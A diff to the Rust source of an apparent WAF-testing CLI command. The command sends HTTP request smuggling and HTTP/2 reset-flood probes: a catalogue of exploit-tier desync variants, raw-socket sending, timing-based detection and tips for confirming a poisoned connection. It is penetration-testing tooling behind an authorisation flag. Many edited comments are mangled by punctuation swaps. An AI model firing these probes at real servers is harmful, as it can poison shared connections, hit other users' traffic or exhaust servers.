@@ -1,41 +1,41 @@
-//! `wafrift smuggle` — HTTP request smuggling probes (CL.TE / TE.CL /
+//! `wafrift smuggle`: HTTP request smuggling probes (CL.TE / TE.CL /
 //! TE.TE / CL.0 / chunk-extension / dual-CL / multi-value-CL, plus the
-//! CVE-class rapid-reset / made-you-reset / settings-storm — see the
+//! CVE-class rapid-reset / made-you-reset / settings-storm, see the
 //! `VARIANTS` catalogue / `wafrift smuggle list` for the live set). NOTE:
 //! `h2c_smuggle` exists in the `wafrift-smuggling` crate but is NOT wired
-//! into this CLI command — do not list it here as available.
+//! into this CLI command (do not list it here as available).
 //!
 //! ## Design
 //!
 //! Built on top of the `wafrift-smuggling` crate, which materialises
 //! every byte of the wire payload. We use a raw `tokio::net::TcpStream`
 //! (NOT reqwest) because any conforming HTTP client normalises the
-//! headers — and normalising the headers DEFEATS the desync. The
+//! headers, and normalising the headers DEFEATS the desync. The
 //! whole point of the attack is that the WAF / front-end parses the
 //! payload one way and the origin parses it another, so the bytes
 //! must reach the wire exactly as constructed.
 //!
 //! ## Subcommands
 //!
-//! * `wafrift smuggle list` — enumerate the variants the engine
+//! * `wafrift smuggle list`: enumerate the variants the engine
 //!   knows about, with their safety tier.
 //!
-//! * `wafrift smuggle dry-run --variant <V> --host <H> --smuggled-prefix <P>` —
+//! * `wafrift smuggle dry-run --variant <V> --host <H> --smuggled-prefix <P>` 
 //!   render the raw wire bytes the variant would send. No network. The
 //!   single fastest way to inspect what wafrift would do, and the basis
 //!   for replaying with `nc`, `curl --raw`, or any other transport.
 //!
-//! * `wafrift smuggle detect <HOST>` — the SAFE default. Fires only
+//! * `wafrift smuggle detect <HOST>`: the SAFE default. Fires only
 //!   the two timing-differential detection probes (CL.TE / TE.CL
 //!   with a short Content-Length that causes the back-end parser to
 //!   HANG waiting for bytes that never arrive, while the front-end
 //!   parser thinks the request is complete and returns immediately).
 //!   Compares per-probe response latency against a baseline of N
 //!   benign GETs. A delta > `--threshold-ms` is a desync signal.
-//!   These probes do NOT poison the connection pool — they cause a
+//!   These probes do NOT poison the connection pool, they cause a
 //!   one-shot hang that times out cleanly.
 //!
-//! * `wafrift smuggle probe <HOST> --variant <V>` — gated behind
+//! * `wafrift smuggle probe <HOST> --variant <V>`: gated behind
 //!   `--unsafe`. Fires exploit-grade payloads that DO desynchronise
 //!   the connection. The next request on the poisoned socket may
 //!   receive the smuggled response, which is exactly the goal, but
@@ -72,7 +72,7 @@ pub(crate) struct SmuggleArgs {
 #[derive(Args, Debug)]
 pub(crate) struct ListArgs {
     /// Output format: `text` (default, human-readable table) or `json`
-    /// (structured array of variant objects — suitable for scripting).
+    /// (structured array of variant objects (suitable for scripting)).
     #[arg(long, default_value = "text", value_parser = ["text", "json"])]
     pub format: String,
 }
@@ -87,14 +87,14 @@ pub(crate) enum SmuggleAction {
     /// sending anything.
     DryRun(DryRunArgs),
 
-    /// Detect a desync via timing differential — fires only the
+    /// Detect a desync via timing differential, fires only the
     /// SAFE detection probes (CL.TE / TE.CL with a short
     /// Content-Length that hangs the back-end without poisoning
     /// the connection pool).
     Detect(DetectSmuggleArgs),
 
     /// Fire an exploit-grade smuggling payload. Gated by
-    /// `--unsafe`. Will poison the connection pool — the next
+    /// `--unsafe`. Will poison the connection pool, the next
     /// request on the socket may receive the smuggled response.
     Probe(ProbeSmuggleArgs),
 }
@@ -107,7 +107,7 @@ pub(crate) struct DryRunArgs {
 
     /// Host the payload claims to target (goes into the `Host:` header).
     /// Accepts either a bare hostname (`example.com`) or a full URL
-    /// (`https://example.com`) — the scheme and path are stripped.
+    /// (`https://example.com`) (the scheme and path are stripped).
     #[arg(long, alias = "target", value_parser = parse_host_or_url)]
     pub host: String,
 
@@ -169,7 +169,7 @@ pub(crate) struct ProbeSmuggleArgs {
 
     /// Required acknowledgement that you have authorisation to
     /// poison this target's connection pool. Without `--unsafe`,
-    /// the probe is refused — exploit-grade payloads can affect
+    /// the probe is refused, exploit-grade payloads can affect
     /// concurrent user traffic on shared connections.
     #[arg(long)]
     pub r#unsafe: bool,
@@ -183,7 +183,7 @@ pub(crate) struct ProbeSmuggleArgs {
     pub format: String,
 }
 
-/// One slot in the variant catalogue — what the engine can build,
+/// One slot in the variant catalogue, what the engine can build,
 /// plus the human-readable explanation and safety tier.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub(crate) enum SafetyTier {
@@ -220,7 +220,7 @@ pub(crate) const VARIANTS: &[VariantInfo] = &[
         key: "cl-te",
         long_name: "Classic CL.TE",
         tier: SafetyTier::Exploit,
-        description: "Front-end honours Content-Length, back-end honours Transfer-Encoding — smuggled prefix becomes a separate request on the back-end.",
+        description: "Front-end honours Content-Length, back-end honours Transfer-Encoding, smuggled prefix becomes a separate request on the back-end.",
     },
     VariantInfo {
         key: "te-cl",
@@ -238,7 +238,7 @@ pub(crate) const VARIANTS: &[VariantInfo] = &[
         key: "cl-0",
         long_name: "CL.0",
         tier: SafetyTier::Exploit,
-        description: "Content-Length: 0 with body — back-end that ignores CL=0 reads the body as a smuggled request.",
+        description: "Content-Length: 0 with body, back-end that ignores CL=0 reads the body as a smuggled request.",
     },
     VariantInfo {
         key: "dual-cl",
@@ -250,7 +250,7 @@ pub(crate) const VARIANTS: &[VariantInfo] = &[
         key: "multi-cl",
         long_name: "Multi-value CL",
         tier: SafetyTier::Exploit,
-        description: "Content-Length: 5, 10 — comma-separated values; some parsers take the first, some the last.",
+        description: "Content-Length: 5, 10, comma-separated values; some parsers take the first, some the last.",
     },
     // R69 pass-21: CVE-2025-55315 chunk-extension TERM.EXT with lone-LF.
     VariantInfo {
@@ -268,24 +268,24 @@ pub(crate) const VARIANTS: &[VariantInfo] = &[
         key: "rapid-reset",
         long_name: "CVE-2023-44487 classic rapid reset",
         tier: SafetyTier::Exploit,
-        description: "HTTP/2 HEADERS + immediate RST_STREAM, repeated — exhausts server stream-creation work without DATA.",
+        description: "HTTP/2 HEADERS + immediate RST_STREAM, repeated, exhausts server stream-creation work without DATA.",
     },
     VariantInfo {
         key: "made-you-reset",
         long_name: "CVE-2025-8671 MadeYouReset",
         tier: SafetyTier::Exploit,
-        description: "PRIORITY frame referencing a closed stream as exclusive dep, then HEADERS — servers that process PRIORITY before stream-liveness check emit internal RST.",
+        description: "PRIORITY frame referencing a closed stream as exclusive dep, then HEADERS, servers that process PRIORITY before stream-liveness check emit internal RST.",
     },
     VariantInfo {
         key: "settings-storm",
         long_name: "HTTP/2 SETTINGS storm",
         tier: SafetyTier::Exploit,
-        description: "Alternating SETTINGS frames forcing peer to re-apply settings — compounds state churn.",
+        description: "Alternating SETTINGS frames forcing peer to re-apply settings, compounds state churn.",
     },
     // ── Kettle BH-USA 2025 "HTTP/1.1 Must Die: The Desync Endgame" ──
     // Frontier desync primitives. The library implementations live in
     // `wafrift-smuggling::smuggling` (registered in KETTLE_DESYNC_PRIMITIVES)
-    // and have been unit-tested since pass-13 but carried no CLI surface —
+    // and have been unit-tested since pass-13 but carried no CLI surface 
     // these wire them through `build_payload` exactly like the rapid-reset
     // family above, so an operator can drive each via
     // `wafrift smuggle probe --variant <K> --unsafe`. All Exploit-tier: each
@@ -293,51 +293,51 @@ pub(crate) const VARIANTS: &[VariantInfo] = &[
     // desync routing on a shared connection.
     VariantInfo {
         key: "zero-cl-desync",
-        long_name: "0.CL desync — Kettle BH25 §3.1",
+        long_name: "0.CL desync: Kettle BH25 §3.1",
         tier: SafetyTier::Exploit,
         description: "Front-end ignores Content-Length and routes on method/path; back-end honours CL and reads the smuggled bytes. Uses the IIS reserved-path (/con) early-response gadget so the poison stays buffered.",
     },
     VariantInfo {
         key: "expect-100-desync",
-        long_name: "Expect: 100-continue 0.CL abuse — Kettle BH25 §5.1",
+        long_name: "Expect: 100-continue 0.CL abuse. Kettle BH25 §5.1",
         tier: SafetyTier::Exploit,
         description: "Front-end answers 100-continue immediately and treats the body as consumed (0 bytes); back-end honours Content-Length and reads the smuggled request off the shared socket.",
     },
     VariantInfo {
         key: "cl-0-via-expect",
-        long_name: "CL.0 via Expect on /images/ — Kettle BH25 §5.3",
+        long_name: "CL.0 via Expect on /images/. Kettle BH25 §5.3",
         tier: SafetyTier::Exploit,
-        description: "POST /images/ + Expect: 100-continue — static/image endpoints answer early (405/100), giving a CL.0 equivalent; the back-end routes elsewhere and reads the smuggled body.",
+        description: "POST /images/ + Expect: 100-continue, static/image endpoints answer early (405/100), giving a CL.0 equivalent; the back-end routes elsewhere and reads the smuggled body.",
     },
     VariantInfo {
         key: "double-desync",
-        long_name: "Double desync 0.CL→CL.0 — Kettle BH25 §6",
+        long_name: "Double desync 0.CL→CL.0. Kettle BH25 §6",
         tier: SafetyTier::Exploit,
-        description: "Two pipelined frames: a 0.CL frame plants the head of a CL.0 attack in the back-end buffer, a following CL.0 frame completes it — converts a self-contained primitive into a victim-affecting desync.",
+        description: "Two pipelined frames: a 0.CL frame plants the head of a CL.0 attack in the back-end buffer, a following CL.0 frame completes it, converts a self-contained primitive into a victim-affecting desync.",
     },
     VariantInfo {
         key: "expect-100-obf",
-        long_name: "Obfuscated Expect — Kettle BH25 §5.2",
+        long_name: "Obfuscated Expect: Kettle BH25 §5.2",
         tier: SafetyTier::Exploit,
-        description: "Trailing-space `100-continue ` Expect value — one parser recognises the directive, the other does not, splitting the body-consumed decision. Canonical pick; the library emits the full whitespace/case matrix.",
+        description: "Trailing-space `100-continue ` Expect value, one parser recognises the directive, the other does not, splitting the body-consumed decision. Canonical pick; the library emits the full whitespace/case matrix.",
     },
     VariantInfo {
         key: "vh-masked-host",
-        long_name: "V-H header masking — Kettle BH25 §4.2",
+        long_name: "V-H header masking. Kettle BH25 §4.2",
         tier: SafetyTier::Exploit,
-        description: "Leading-space Host line — visible to the front-end parser, ignored or misrouted by the back-end. Space-prefix pick; the library also emits the name-rewrite (Host→Xost) form.",
+        description: "Leading-space Host line, visible to the front-end parser, ignored or misrouted by the back-end. Space-prefix pick; the library also emits the name-rewrite (Host→Xost) form.",
     },
     VariantInfo {
         key: "malformed-host-split",
-        long_name: "H-V malformed Host ALB+IIS — Kettle BH25 §7",
+        long_name: "H-V malformed Host ALB+IIS. Kettle BH25 §7",
         tier: SafetyTier::Exploit,
-        description: "Delimiter byte inside the Host value — AWS ALB 400s it, IIS accepts and reroutes; on a poisoned connection IIS-processed responses reach victims. First-delimiter pick; the library emits all eight.",
+        description: "Delimiter byte inside the Host value. AWS ALB 400s it, IIS accepts and reroutes; on a poisoned connection IIS-processed responses reach victims. First-delimiter pick; the library emits all eight.",
     },
     VariantInfo {
         key: "chunk-ext-keyval",
-        long_name: "Chunk-extension key=value confusion — Kettle BH25 §10",
+        long_name: "Chunk-extension key=value confusion. Kettle BH25 §10",
         tier: SafetyTier::Exploit,
-        description: "`5;x=y` chunk-extension — strict parsers reject the extension, lenient ones accept it, disagreeing on where chunk data ends. Complements chunk-ext-lone-lf with the key=value form. Canonical pick of the library's eight extension shapes.",
+        description: "`5;x=y` chunk-extension, strict parsers reject the extension, lenient ones accept it, disagreeing on where chunk data ends. Complements chunk-ext-lone-lf with the key=value form. Canonical pick of the library's eight extension shapes.",
     },
     // ── Additional library smuggling primitives ──
     // Public in `wafrift-smuggling::smuggling` (listed in `all_payloads`) but
@@ -348,35 +348,35 @@ pub(crate) const VARIANTS: &[VariantInfo] = &[
         key: "method-body",
         long_name: "GET-with-body smuggling",
         tier: SafetyTier::Exploit,
-        description: "GET request carrying a Content-Length body — RFC discourages bodies on GET, so front-end and back-end disagree on whether the body belongs to THIS request or starts the next; the smuggled prefix rides in the body.",
+        description: "GET request carrying a Content-Length body. RFC discourages bodies on GET, so front-end and back-end disagree on whether the body belongs to THIS request or starts the next; the smuggled prefix rides in the body.",
     },
     VariantInfo {
         key: "http10-persistence",
         long_name: "HTTP/1.0 persistence disagreement",
         tier: SafetyTier::Exploit,
-        description: "HTTP/1.0 + Connection: keep-alive (a 1.0 extension, not core) — front-end and back-end disagree on whether the connection persists, desyncing the next request on a reused socket.",
+        description: "HTTP/1.0 + Connection: keep-alive (a 1.0 extension, not core), front-end and back-end disagree on whether the connection persists, desyncing the next request on a reused socket.",
     },
     VariantInfo {
         key: "http09-downgrade",
         long_name: "HTTP/0.9 simple-request downgrade",
         tier: SafetyTier::Exploit,
-        description: "Bare `GET /` with no HTTP-version token (HTTP/0.9 simple request) — servers that still honour 0.9 read the following bytes as a fresh request; proxies that don't may forward them verbatim, splitting the stream.",
+        description: "Bare `GET /` with no HTTP-version token (HTTP/0.9 simple request), servers that still honour 0.9 read the following bytes as a fresh request; proxies that don't may forward them verbatim, splitting the stream.",
     },
     VariantInfo {
         key: "cl-obfuscation",
         long_name: "Content-Length value obfuscation",
         tier: SafetyTier::Exploit,
-        description: "Content-Length with a non-canonical value form (`+5`, `05`, `5 `, tab-prefixed) — lenient parsers accept the obfuscated length, strict ones reject or read a different count, disagreeing on the body boundary. Canonical pick of the library's four.",
+        description: "Content-Length with a non-canonical value form (`+5`, `05`, `5 `, tab-prefixed), lenient parsers accept the obfuscated length, strict ones reject or read a different count, disagreeing on the body boundary. Canonical pick of the library's four.",
     },
     VariantInfo {
         key: "chunk-size-mutation",
         long_name: "Chunk-size formatting mutation",
         tier: SafetyTier::Exploit,
-        description: "Chunked body whose chunk-SIZE line uses a non-canonical form (leading zeros / uppercase hex / trailing `;` / tab) — parsers disagree on the chunk length, splitting the stream. Canonical pick of the library's four. (Distinct from chunk-ext-*, which mutate the extension, not the size.)",
+        description: "Chunked body whose chunk-SIZE line uses a non-canonical form (leading zeros / uppercase hex / trailing `;` / tab), parsers disagree on the chunk length, splitting the stream. Canonical pick of the library's four. (Distinct from chunk-ext-*, which mutate the extension, not the size.)",
     },
 ];
 
-/// Wrapper for the `--variant` arg — parses the string key to a
+/// Wrapper for the `--variant` arg, parses the string key to a
 /// `VariantInfo` so the dispatch logic stays data-driven.
 #[derive(Debug, Clone, Copy)]
 pub(crate) struct VariantSelector {
@@ -392,14 +392,14 @@ fn parse_host_or_url(s: &str) -> Result<String, String> {
         .strip_prefix("http://")
         .or_else(|| s.strip_prefix("https://"))
     {
-        // rest is "host/path?query" — take up to the first '/' or '?'
+        // rest is "host/path?query" (take up to the first '/' or ')?'
         let host = rest.split(['/', '?', '#']).next().unwrap_or(rest);
         if host.is_empty() {
             return Err(format!("no host found in URL `{s}`"));
         }
         Ok(host.to_string())
     } else {
-        // Bare hostname (or host:port) — pass through as-is.
+        // Bare hostname (or host:port) (pass through as-is).
         Ok(s.to_string())
     }
 }
@@ -419,7 +419,7 @@ fn parse_variant_name(s: &str) -> Result<VariantSelector, String> {
 }
 
 /// Render escaped `\r\n` / `\t` sequences in the user-supplied
-/// smuggled prefix to actual CRLF bytes — operators paste the
+/// smuggled prefix to actual CRLF bytes, operators paste the
 /// human-readable form on the command line, we restore the wire
 /// form before handing it to the engine.
 #[must_use]
@@ -459,9 +459,9 @@ pub(crate) fn unescape_prefix(s: &str) -> String {
 /// a variant is one row in `VARIANTS` plus one match arm here.
 /// Take the canonical (first) payload from a library fan-out that
 /// returns a `Vec<SmugglingPayload>`, mapping the safety error to a
-/// `String`. The smuggle CLI fires ONE payload per `--variant` key —
+/// `String`. The smuggle CLI fires ONE payload per `--variant` key 
 /// the same single-representative contract as `te-te` (index 1) and
-/// `chunk-ext-lone-lf` — and each library builder emits its canonical
+/// `chunk-ext-lone-lf`: and each library builder emits its canonical
 /// variant first, so the head element is the one surfaced. The full
 /// matrix stays reachable via the library for the probe aggregator and
 /// property suites.
@@ -492,7 +492,7 @@ fn build_payload(
         "chunk-ext-lone-lf" => {
             smuggling::chunk_extension_lone_lf(host, smuggled_prefix).map_err(|e| format!("{e}"))
         }
-        // R69 pass-21: rapid_reset variants wired via the CLI — the
+        // R69 pass-21: rapid_reset variants wired via the CLI, the
         // library functions live in `wafrift-smuggling::rapid_reset`.
         // Each returns raw HTTP/2 wire bytes inside a typed
         // descriptor; we extract `wire_bytes` and wrap in a
@@ -512,7 +512,7 @@ fn build_payload(
         }
         "made-you-reset" => {
             // made_you_reset_burst returns a Vec<MadeYouResetProbe>
-            // each carrying ONLY a PRIORITY+HEADERS pair — no client
+            // each carrying ONLY a PRIORITY+HEADERS pair, no client
             // preface. Prepend the canonical preface + initial
             // SETTINGS so the wire is a valid HTTP/2 session before
             // the per-probe frames arrive (matches the shape that
@@ -620,14 +620,14 @@ pub(crate) struct DetectFinding {
 
 /// Open a raw TCP connection, send the payload bytes, return how
 /// long we waited for the first byte (or until timeout). Times the
-/// FIRST byte specifically — that's the most diagnostic signal: a
+/// FIRST byte specifically, that's the most diagnostic signal: a
 /// healthy back-end answers immediately, a desync'd one hangs until
 /// it gives up on the truncated chunked body.
-/// Resolve `host:port` to a single `SocketAddr` ONCE per command — every
+/// Resolve `host:port` to a single `SocketAddr` ONCE per command, every
 /// subsequent connect uses the cached address, eliminating per-probe DNS
 /// overhead. On networks where DNS lookups take ~50 ms each, a 3-sample
 /// baseline + 2 detect probes used to pay 5 lookups (~250 ms) for the
-/// same hostname; the resolved variant pays it once. Pure helper — no
+/// same hostname; the resolved variant pays it once. Pure helper, no
 /// I/O beyond the lookup itself.
 ///
 /// Pass 20 R1 §1 SPEED.
@@ -649,7 +649,7 @@ async fn time_first_byte(addr: SocketAddr, bytes: &[u8], timeout_secs: u64) -> R
         // timeout, conflating "host unreachable" with "back-end hung
         // on the response." If the connect timed out at 8 s but the
         // benign baseline connects fast (200 ms), the delta was
-        // 7800 ms — false DESYNC inferred. The READ timeout below
+        // 7800 ms, false DESYNC inferred. The READ timeout below
         // is the genuine "back-end is hanging" signal we want; the
         // CONNECT timeout means the network never got us in. Surface
         // it as Err so the caller aborts the probe and the operator
@@ -667,14 +667,14 @@ async fn time_first_byte(addr: SocketAddr, bytes: &[u8], timeout_secs: u64) -> R
     match timeout(Duration::from_secs(timeout_secs), read_fut).await {
         Ok(Ok(_)) => Ok(start.elapsed().as_millis() as u64),
         Ok(Err(_)) => Ok(start.elapsed().as_millis() as u64),
-        // Read timeout IS the desync signal — back-end accepted the
+        // Read timeout IS the desync signal, back-end accepted the
         // request and is hanging on the truncated chunked body. Bin
         // it at the budget for the delta calculation.
         Err(_) => Ok(timeout_secs * 1000),
     }
 }
 
-/// Median latency over N baseline GETs — the per-host "this is how
+/// Median latency over N baseline GETs, the per-host "this is how
 /// long an honest request takes on this network right now" anchor
 /// the detection probe is compared against.
 async fn measure_baseline(
@@ -698,7 +698,7 @@ async fn measure_baseline(
 
 /// Classify a single timing measurement against the baseline.
 /// Returns `desync_inferred = true` iff the probe took at least
-/// `threshold_ms` LONGER than the baseline. Pure function — the I/O
+/// `threshold_ms` LONGER than the baseline. Pure function, the I/O
 /// already happened; this is the gate the test suite covers.
 #[must_use]
 pub(crate) fn classify_detection(
@@ -718,25 +718,25 @@ pub(crate) fn classify_detection(
 }
 
 /// Desync-specific interpretation of the response to a fired exploit
-/// payload — orthogonal to `smuggle-fire`'s `bypass_signal` (which answers
+/// payload, orthogonal to `smuggle-fire`'s `bypass_signal` (which answers
 /// WAF block-vs-allow). This answers whether the front-end ACCEPTED the
 /// desynchronising framing, the single most diagnostic thing about the
 /// attack response that `run_probe` previously read but never classified.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
 #[serde(rename_all = "kebab-case")]
 pub(crate) enum DesyncSignal {
-    /// Front-end returned 400/501/505 — it rejected the malformed framing;
+    /// Front-end returned 400/501/505, it rejected the malformed framing;
     /// the desync was normalised away and this variant won't poison the pool.
     FramingRejected,
-    /// Front-end returned a normal status — it forwarded the request as
+    /// Front-end returned a normal status, it forwarded the request as
     /// framed, so the desync is plausible; confirm with a replayed follow-up.
     FramingAccepted,
-    /// No bytes returned and the read timed out — the classic desync hang
+    /// No bytes returned and the read timed out, the classic desync hang
     /// (back-end waiting for body bytes the front-end won't forward).
     BackendHang,
-    /// Connection closed with zero bytes — inconclusive.
+    /// Connection closed with zero bytes (inconclusive).
     NoResponse,
-    /// Bytes returned but not a parseable HTTP/1 response — HTTP/2 frames
+    /// Bytes returned but not a parseable HTTP/1 response. HTTP/2 frames
     /// (rapid-reset family), a raw banner, or a corrupted partial desync.
     Anomalous,
 }
@@ -760,25 +760,25 @@ impl DesyncSignal {
     fn guidance(self) -> &'static str {
         match self {
             Self::FramingRejected => {
-                "front-end rejected the desync framing — this variant is normalised away; try an obfuscated variant (te-te / chunk-ext-lone-lf)."
+                "front-end rejected the desync framing (this variant is normalised away; try an obfuscated variant (te-te / chunk-ext-lone-lf))."
             }
             Self::FramingAccepted => {
-                "front-end accepted the framing — the desync is plausible; replay a benign follow-up on a fresh connection (nc/curl) to confirm the smuggled prefix surfaces on the next request."
+                "front-end accepted the framing, the desync is plausible; replay a benign follow-up on a fresh connection (nc/curl) to confirm the smuggled prefix surfaces on the next request."
             }
             Self::BackendHang => {
-                "back-end hung with no response past the timeout — consistent with a CL/TE length disagreement (parser waiting for bytes the front-end won't forward)."
+                "back-end hung with no response past the timeout (consistent with a CL/TE length disagreement (parser waiting for bytes the front-end won't forward))."
             }
             Self::NoResponse => {
-                "connection closed with no bytes — inconclusive; the front-end may have dropped the malformed request."
+                "connection closed with no bytes (inconclusive; the front-end may have dropped the malformed request)."
             }
             Self::Anomalous => {
-                "received bytes that don't parse as an HTTP/1 response — inspect the preview above (could be HTTP/2 frames or a partial desync)."
+                "received bytes that don't parse as an HTTP/1 response (inspect the preview above (could be HTTP/2 frames or a partial desync))."
             }
         }
     }
 }
 
-/// Map the parsed status + I/O outcome to a [`DesyncSignal`]. Pure — the
+/// Map the parsed status + I/O outcome to a [`DesyncSignal`]. Pure, the
 /// read already happened; this is the gate the test suite covers (mirrors
 /// [`classify_detection`]). A parsed status line is the strongest signal:
 /// the read may still "time out" afterwards on a keep-alive socket, which
@@ -807,7 +807,7 @@ pub(crate) fn classify_desync_outcome(
 }
 
 async fn run_detect(args: DetectSmuggleArgs) -> ExitCode {
-    // TRACING: probe start — operator can confirm parameters at debug level.
+    // TRACING: probe start (operator can confirm parameters at debug level).
     debug!(
         target: "wafrift::smuggle",
         host = %args.host,
@@ -828,7 +828,7 @@ async fn run_detect(args: DetectSmuggleArgs) -> ExitCode {
             args.threshold_ms
         );
     }
-    // Resolve once — every probe + baseline sample reuses the same
+    // Resolve once, every probe + baseline sample reuses the same
     // SocketAddr instead of paying DNS per call. Pass 20 R1 §1 SPEED.
     let addr = match resolve_host_once(&args.host, args.port).await {
         Ok(a) => a,
@@ -882,7 +882,7 @@ async fn run_detect(args: DetectSmuggleArgs) -> ExitCode {
         };
         let mut f = classify_detection(elapsed, baseline_ms, args.threshold_ms);
         f.variant = variant_key.to_string();
-        // TRACING: per-probe classification result — the key decision point.
+        // TRACING: per-probe classification result (the key decision point).
         // At debug level the operator sees why each probe was/wasn't flagged.
         if f.desync_inferred {
             info!(
@@ -986,7 +986,7 @@ fn run_list(format: &str) -> ExitCode {
             SafetyTier::Exploit => "[EXPLOIT]".red().bold(),
         };
         println!(
-            "  {} {} — {}\n    {}",
+            "  {} {}: {}\n    {}",
             tag,
             v.key.bold(),
             v.long_name,
@@ -1003,7 +1003,7 @@ fn run_list(format: &str) -> ExitCode {
 
 /// Replace standalone `\n` (lone LF, 0x0A) with the visible token `<LF>\n`
 /// so that raw dry-run output makes the invisible control byte apparent.
-/// Does NOT replace `\n` that is immediately preceded by `\r` — those are
+/// Does NOT replace `\n` that is immediately preceded by `\r`: those are
 /// legitimate CRLF line endings and should not be annotated.
 ///
 /// This is a pure formatter used only in text/raw dry-run output; it never
@@ -1051,7 +1051,7 @@ fn run_dry(args: DryRunArgs) -> ExitCode {
         }
     } else {
         // Fix #8: for variants with lone-LF semantics the bare 0x0A byte is
-        // invisible in a terminal — the cursor returns to column 0 without a
+        // invisible in a terminal, the cursor returns to column 0 without a
         // newline being printed.  Annotate standalone 0x0A (NOT 0x0D 0x0A) as
         // `<LF>` so the operator can see the byte that triggers the desync.
         // We key on the variant's key string rather than scanning the bytes so
@@ -1096,7 +1096,7 @@ fn run_dry(args: DryRunArgs) -> ExitCode {
     // For --format raw or --format hex, the meta belongs on
     // STDOUT (in a comment-style prefix so it doesn't corrupt
     // hex/raw parsing). For --format json (if ever added), we
-    // skip the meta entirely — the JSON envelope carries the
+    // skip the meta entirely, the JSON envelope carries the
     // canary already.
     let meta = format!(
         "── meta ── variant={} canary={} bytes={}",
@@ -1129,7 +1129,7 @@ async fn run_probe(args: ProbeSmuggleArgs) -> ExitCode {
             "exploit-tier probe refused: --unsafe not set"
         );
         eprintln!(
-            "{} variant `{}` is EXPLOIT-tier — it WILL desync the \
+            "{} variant `{}` is EXPLOIT-tier, it WILL desync the \
              connection pool. Re-run with `--unsafe` to acknowledge \
              you have authorisation to test this target.",
             "refused:".red().bold(),
@@ -1146,7 +1146,7 @@ async fn run_probe(args: ProbeSmuggleArgs) -> ExitCode {
             return ExitCode::from(1);
         }
     };
-    // TRACING: exploit probe about to fire — canary token lets operator
+    // TRACING: exploit probe about to fire, canary token lets operator
     // correlate the wire send with any canary echo they observe.
     // No sensitive value in the log: variant, host, byte count, and
     // canary (a random nonce, not a credential) are all public to the operator.
@@ -1170,7 +1170,7 @@ async fn run_probe(args: ProbeSmuggleArgs) -> ExitCode {
             payload.canary.token
         );
     }
-    // Resolve once before connecting. Pass 20 R1 §1 SPEED — pre-fix the
+    // Resolve once before connecting. Pass 20 R1 §1 SPEED, pre-fix the
     // exploit probe paid an extra DNS lookup that the detect path didn't.
     let addr = match resolve_host_once(&args.host, args.port).await {
         Ok(a) => a,
@@ -1199,7 +1199,7 @@ async fn run_probe(args: ProbeSmuggleArgs) -> ExitCode {
         eprintln!("{} tcp flush: {e}", "error:".red());
         return ExitCode::from(1);
     }
-    // Bounded read — hostile target could ship an unbounded
+    // Bounded read, hostile target could ship an unbounded
     // stream and OOM the scanner.
     // R50 pass-12 I4 (CLAUDE.md §7 DEDUPLICATION): reuse the
     // canonical cap from safe_body instead of redefining locally.
@@ -1212,7 +1212,7 @@ async fn run_probe(args: ProbeSmuggleArgs) -> ExitCode {
                 Ok(0) => break,
                 Ok(n) => {
                     if buf.len() + n > MAX_SMUGGLE_RESPONSE_BYTES {
-                        // Hostile target — stop reading.
+                        // Hostile target (stop reading).
                         break;
                     }
                     buf.extend_from_slice(&chunk[..n]);
@@ -1233,7 +1233,7 @@ async fn run_probe(args: ProbeSmuggleArgs) -> ExitCode {
     // a raw preview to eyeball.
     let parsed_status = crate::helpers::http_status_from_raw(&buf);
     let desync = classify_desync_outcome(parsed_status, bytes_read, read_result.is_err());
-    // TRACING: response received — gives the operator latency and byte count
+    // TRACING: response received, gives the operator latency and byte count
     // without requiring them to parse text output.
     debug!(
         target: "wafrift::smuggle",
@@ -1282,7 +1282,7 @@ async fn run_probe(args: ProbeSmuggleArgs) -> ExitCode {
          poisoned. The smuggled prefix will surface on the NEXT request \
          that lands on this back-end socket. Replay with `nc` or `curl` \
          to observe the smuggled response. Note: canary `{}` is wafrift's \
-         correlation ID for THIS probe in the output above — it is NOT \
+         correlation ID for THIS probe in the output above, it is NOT \
          auto-embedded in your prefix, so put a unique marker (e.g. this \
          token) inside `--smuggled-prefix` and grep the replayed response \
          for it to confirm the smuggle landed.",
@@ -1294,7 +1294,7 @@ async fn run_probe(args: ProbeSmuggleArgs) -> ExitCode {
         |s| format!("status {s}"),
     );
     println!(
-        "\n{} {} ({}) — {}",
+        "\n{} {} ({}): {}",
         "desync signal:".yellow().bold(),
         desync.as_str().bold(),
         status_note,
@@ -1366,7 +1366,7 @@ mod tests {
     #[test]
     fn classify_desync_outcome_status_wins_over_timeout() {
         // A complete response that "timed out" afterwards is a keep-alive
-        // socket, NOT a hang — the parsed status must still decide.
+        // socket, NOT a hang (the parsed status must still decide).
         assert_eq!(
             classify_desync_outcome(Some(200), 120, true),
             DesyncSignal::FramingAccepted
@@ -1395,7 +1395,7 @@ mod tests {
 
     #[test]
     fn classify_desync_outcome_anomalous_on_unparseable_bytes() {
-        // Bytes came back but no HTTP/1 status line — H2 frames or a banner.
+        // Bytes came back but no HTTP/1 status line. H2 frames or a banner.
         assert_eq!(
             classify_desync_outcome(None, 200, false),
             DesyncSignal::Anomalous
@@ -1467,7 +1467,7 @@ mod tests {
 
     #[test]
     fn classify_detection_handles_baseline_higher_than_probe() {
-        // A negative delta — probe came back FASTER than baseline —
+        // A negative delta, probe came back FASTER than baseline 
         // is never a desync signal.
         let f = classify_detection(100, 500, 1500);
         assert!(!f.desync_inferred);
@@ -1476,7 +1476,7 @@ mod tests {
 
     #[test]
     fn classify_detection_fires_at_exactly_threshold() {
-        // Boundary — delta == threshold counts as desync.
+        // Boundary (delta == threshold counts as desync).
         let f = classify_detection(1700, 200, 1500);
         assert!(f.desync_inferred);
         assert_eq!(f.delta_ms, 1500);
@@ -1719,7 +1719,7 @@ mod tests {
     #[test]
     fn expect_100_obf_uses_trailing_space_canonical() {
         let wire = kettle_wire("expect-100-obf");
-        // Trailing space after the directive — the canonical obfuscation.
+        // Trailing space after the directive (the canonical obfuscation).
         assert!(
             wire.contains("Expect: 100-continue \r\n"),
             "expected trailing-space Expect value: {wire:?}"
@@ -1729,7 +1729,7 @@ mod tests {
     #[test]
     fn vh_masked_host_space_prefixes_a_header_line() {
         let wire = kettle_wire("vh-masked-host");
-        // CRLF then a SPACE then the masked header — front-end sees it,
+        // CRLF then a SPACE then the masked header, front-end sees it,
         // back-end folds/ignores it.
         assert!(
             wire.contains("\r\n Host: example.com"),
@@ -1837,7 +1837,7 @@ mod tests {
 
     #[test]
     fn detect_cl_te_payload_does_not_smuggle_a_user_prefix() {
-        // Detection variants accept an empty prefix — they're
